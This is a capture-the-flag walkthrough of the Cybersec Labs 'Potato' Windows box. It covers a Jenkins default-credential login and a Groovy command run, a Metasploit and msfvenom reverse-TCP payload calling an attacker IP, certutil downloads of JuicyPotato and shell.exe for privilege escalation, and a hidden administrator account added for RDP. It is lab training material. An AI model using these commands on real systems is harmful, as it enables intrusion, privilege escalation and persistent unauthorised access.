# Cybersec Labs- Potato

>Abdullah Rizwan | 03:14 PM , 31st October ,2020

## NMAP

```
Host is up (0.22s latency).                                                                                                                  [13/50]
Not shown: 990 closed ports          
PORT      STATE SERVICE            VERSION                                
135/tcp   open  msrpc              Microsoft Windows RPC                                                                                            
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn                                                                                    
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds                                                             
3389/tcp  open  ssl/ms-wbt-server?                                        
| rdp-ntlm-info:                                                          
|   Target_Name: POTATO              
|   NetBIOS_Domain_Name: POTATO                                           
|   NetBIOS_Computer_Name: POTATO                                         
|   DNS_Domain_Name: Potato          
|   DNS_Computer_Name: Potato                                                                                                                       
|   Product_Version: 6.3.9600                                                                                                                       
|_  System_Time: 2020-10-31T10:14:06+00:00                                
| ssl-cert: Subject: commonName=Potato                                    
| Not valid before: 2020-10-30T07:00:02                                   
|_Not valid after:  2021-05-01T07:00:02                                   
8080/tcp  open  http               Jetty 9.4.z-SNAPSHOT                   
| http-robots.txt: 1 disallowed entry                                     
|_/                                  
|_http-server-header: Jetty(9.4.z-SNAPSHOT)                               
|_http-title: Site doesn't have a title (text/html;charset=utf-8).                                                                                  
49152/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49153/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49154/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49155/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49163/tcp open  msrpc              Microsoft Windows RPC                                                                                            
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows                                                            

Host script results:                 
|_nbstat: NetBIOS name: POTATO, NetBIOS user: <unknown>, NetBIOS MAC: 0a:79:b7:7d:7b:a0 (unknown)                                                   
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)                                                                                
| smb-security-mode:                 
|   account_used: guest              
|   authentication_level: user                                            
|   challenge_response: supported                                         
|_  message_signing: disabled (dangerous, but default)                    
| smb2-security-mode:                
|   2.02:                            
|_    Message signing enabled but not required                            
| smb2-time:                         
|   date: 2020-10-31T10:14:06                                             
|_  start_date: 2020-10-31T07:00:01                                       

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .    
```

## SMB Shares (PORT 139)

I tried to list the smb shares on the box , but we need an authenticated user to access the shares
```
root@kali:~/Cybersec Labs/Easy/Potato# smbclient -L \\\\172.31.1.19\\
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
root@kali:~/Cybersec Labs/Easy/Potato# 

```

## PORT 8080

<img src="https://imgur.com/8YtwWwv.png"/>

Let's try entering username `admin` and password `admin`

<img src="https://imgur.com/ltGq467.png"/>

We got in

Now looking at how to exploit `jenkins` visit `https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins`

<img src="https://imgur.com/rKYNgcf.png"/>

Now let's see if there is a RCE vulnerability here

```
def process = "cmd.exe /c dir".execute()
println "Found text ${process.text}"
```
`cmd.exe` invokes command prompt , `/c dir` will give the command to cmd to run `dir` (list directories)

<img src="https://imgur.com/h2sezF2.png"/>

Our command got executed

<img src="https://imgur.com/Lw7kF88.png"/>

Here it says that there is a metasploit exploit for jenkins

<img src="https://imgur.com/c1IZ2t7.png"/>

<img src="https://imgur.com/OXXkkBP.png"/>

Now this configuration didn't work because `TARGETURI` was not set correctly , you can see that in our case `TARGETURI` should be `/` because there is no `jenkins directory`  also it was not required to enter credentials but since we know it I entered them for the safe side

<img src="https://imgur.com/Hsc7ub6.png"/>

Wait for a minute to send the bytes to our target and we will have a meterpreter session

<img src="https://imgur.com/7mXx70Z.png"/>

Now this is looking overwhelming so that there are `key` files here but we donot what are they for , so let's upload `winpeas` for enumeration


<img src="https://imgur.com/K2k43mx.png"/>

<img src="https://imgur.com/FLctkrG.png"/>

<img src="https://imgur.com/dVcZH1D.png"/>

Here we can see that we can abuse this service to get escalated privileges

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

https://github.com/ohpe/juicy-potato

Now we need to upload two executeables files on the target , first as you can see from the links that we gain `nt\authority` through juicy potato that will run our windows payload.

## Msfvenom

To generate a payload 

```
root@kali:~/Cybersec Labs/Easy/Potato# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.37 LPORT=7777 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

## JuicyPotato

Download juicypotato.exe

<img src="https://imgur.com/iMv7omY.png"/>


Host them on your local machine

```
root@kali:~/Cybersec Labs/Easy/Potato# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
`certutil.exe -urlcache -f http://10.10.1.37:80/JuicyPotato.exe JuicyPotato.exe`

`certutil.exe -urlcache -f http://10.10.1.37:80/shell.exe shell.exe`

<img src="https://imgur.com/wQUKh6t.png"/>

Now we have those two files on our target system


Set a meterperter listener

```
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set LPORT 7777
LPORT => 7777
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.1.37:7777 

```

<img src="https://imgur.com/EpDqm3E.png"/>

Now get the user and root flag

<img src="https://imgur.com/0zM0Zr6.png"/>

<img src="https://imgur.com/y4nMSLv.png"/>

# Extra RDP (PORT 3389)

We can also access the system through GUI , metasploit has a command that can add a user with system privleges 

```
meterpreter > run getgui -u arz -p $123aBc

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Setting user account for logon
[*]     Adding User: arz with Password: $123aBc
[*]     Hiding user from Windows Login screen
[*]     Adding User: arz to local group 'Remote Desktop Users'
[*]     Adding User: arz to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20201031.3756.rc

```
I used this password because password policy wasn't allowing me to set a simple password 

Using `remmina` 

<img src="https://imgur.com/aQpYliu.png"/>

And we can now control the whole system through GUI as well
<img src="https://imgur.com/hv7XNKR.png"/>
